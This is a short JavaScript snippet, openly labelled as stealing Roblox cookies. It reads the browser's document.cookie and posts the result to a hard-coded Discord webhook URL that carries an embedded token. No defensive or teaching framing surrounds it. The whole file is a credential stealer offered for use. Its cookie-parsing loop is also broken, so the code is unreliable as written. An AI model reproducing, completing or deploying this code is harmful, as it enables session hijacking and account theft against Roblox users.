// Replace <YourDiscordWebhookURL> with your actual Discord Webhook URL.
const discordWebhookURL = "https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4";

// Function to send message to Discord webhook
function sendToWebhook(message) {
  const headers = {
    "Content-Type": "application/json"
  };
  const body = JSON.stringify({content: message});

  fetch(discordWebhookURL, {method: 'POST', headers: headers, body: body})
    .then(response => response.json())
    .catch(error => console.error('Error:', error));
}

// Get Roblox cookies using JavaScript's document.cookie property
const cookieJar = {};
for (let i = 0; i < document.cookie.length; i++) {
  const c = document.cookie[i];
  const pl = c.indexOf(";");
  if (pl > -1) document.cookie = c.substring(0, pl);
  const pair = document.cookie.split("=")[0];
  cookieJar[pair] = document.cookie.split("=")[1];
}

// Send the stolen cookies to Discord webhook
const message = JSON.stringify(cookieJar);
sendToWebhook(message);
